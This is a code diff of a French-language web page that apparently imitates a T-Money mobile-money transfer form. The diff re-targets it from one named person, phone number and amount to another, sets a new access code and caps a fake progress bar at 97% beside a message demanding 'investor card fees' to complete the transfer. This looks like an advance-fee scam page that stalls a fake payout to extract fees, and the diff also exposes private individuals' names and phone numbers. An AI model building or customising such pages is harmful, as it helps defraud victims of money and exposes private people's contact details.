@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="DAVID Touarikissa" disabled />
+        <input type="text" id="name" value="Bawa Jemima " disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+242 05 381 4438" disabled />
+        <input type="tel" id="phone" value="+225 05 95 33 61 88" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="322.000 FCFA  " disabled />
+        <input type="text" id="amount" value="317.000 FCFA  " disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-         Action requise : Veillez payer les frais de carte d'investisseur pour terminer le transfert.
+         Action requise : Veillez payer les frais de carte d'investisseur afin de terminer le transfert.
 
       </div>
     </form>
@@ -213,7 +213,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "4438") {
+      if (code === "6188") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
@@ -232,7 +232,7 @@
       const progressPercentage = document.getElementById("progressPercentage");
 
       const totalTime = 2 * 60 * 1000;
-      const maxProgress = 99;
+      const maxProgress = 97;
       const intervalTime = totalTime / maxProgress;
 
       const interval = setInterval(() => {
